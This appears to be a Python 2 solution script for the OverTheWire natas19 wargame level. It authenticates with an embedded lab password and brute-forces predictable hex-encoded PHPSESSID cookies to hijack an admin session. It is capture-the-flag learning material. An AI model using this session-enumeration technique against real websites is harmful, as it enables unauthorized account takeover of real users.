import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas19.natas.labs.overthewire.org/index.php'
response = ''
# base auth
auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
suffix = '2d61646d696e'

# try out all possible session ids
for id in range(0, 1000):
    z = id % 10
    y = ((id - z) % 100) / 10
    x = (id - y - z) / 100
    z = str(z)
    y = str(y)
    x = str(x)
    sessionId = '3' + x + '3' + y + '3' + z + suffix
    print(sessionId)
    cookies = {'PHPSESSID': sessionId}
    x = requests.post(url, auth = auth, cookies = cookies)
    response = x.text
    if('next level' in response):
        print response
        break
